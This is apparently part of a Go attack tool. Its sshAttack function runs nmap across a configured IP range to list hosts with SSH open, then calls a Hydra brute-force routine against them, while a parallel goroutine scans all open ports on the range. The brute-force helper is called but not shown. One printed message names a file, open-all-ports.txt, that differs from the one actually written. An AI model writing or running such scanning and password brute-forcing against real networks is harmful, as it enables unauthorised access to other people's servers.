package main

import (
	"fmt"
	"sync"
)

func sshAttack(skipNmap bool) {
	if skipNmap {
		runHydraBruteForceToFiles()
		return
	}

	var wg sync.WaitGroup

	wg.Add(2)
	go func() {
		defer wg.Done()
		fmt.Println("scanning ssh opened ports...")
		execCmd(fmt.Sprintf("nmap -n -p ssh --open %v -oG - | awk '/Up$/{print $2}' > open-ssh-ports.txt", IP_RANGE))

		runHydraBruteForceToFiles()
	}()

	go func() {
		defer wg.Done()
		fmt.Println("scanning all available open ports writing to open-all-ports.txt...")
		execCmd(fmt.Sprintf("nmap %v --open > open-ports.txt", IP_RANGE))
		fmt.Println("Writing every open ports IP to open-all-ports.txt if you want to check manually")
	}()
	wg.Wait()

	fmt.Println("done")
}
